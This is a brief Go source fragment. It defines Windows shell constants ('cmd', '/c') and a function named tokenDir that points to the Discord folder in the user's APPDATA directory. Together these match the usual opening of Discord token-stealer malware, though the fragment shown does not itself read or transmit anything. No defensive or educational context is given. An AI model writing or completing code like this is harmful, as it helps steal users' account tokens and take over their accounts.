package main

import (
	"os"
	"path/filepath"
)

const SH = "cmd"
const C = "/c"

func tokenDir() (string, error) {
	return filepath.Join(os.Getenv("APPDATA"), "Discord"), nil
}
